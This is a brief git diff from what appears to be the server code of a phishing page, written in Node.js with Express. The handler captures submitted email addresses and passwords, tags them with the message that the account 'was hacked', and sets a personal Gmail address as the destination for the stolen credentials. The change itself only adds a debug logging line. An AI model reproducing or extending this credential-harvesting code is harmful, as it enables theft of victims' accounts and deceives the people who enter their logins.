@@ -29,7 +29,7 @@ app.get('/', function (req, res) {
 app.post('/_', function (req, res) {
    // res.render('f_success');
     var captured_content = `\n Email: ${req.body.email} Password: ${req.body.password}`;
-    
+    console.log(req.body.uesr);
     console.log("es");
     var message = "If input value has correct then id was hacked "+captured_content;
     var toEmail = "mdalonebd@gmail.com";
